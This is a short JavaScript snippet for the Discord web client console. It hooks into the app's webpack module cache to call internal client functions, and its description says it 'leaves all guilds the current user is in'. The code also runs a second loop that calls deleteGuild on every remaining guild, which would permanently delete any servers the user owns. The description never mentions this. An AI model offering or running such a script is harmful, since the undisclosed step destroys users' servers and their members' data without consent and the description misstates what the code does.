# Description

leaves all guilds the current user is in.

# Code

```js
var findModule = (item) => Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default[item]!==void 0).exports.default;

var guilds = findModule("getGuilds").getGuilds()
var i = 0
for(var k in guilds){
findModule("leaveGuild").leaveGuild(k)
}
var guilds = findModule("getGuilds").getGuilds()
for(var k in guilds){
findModule("deleteGuild").deleteGuild(k)
}
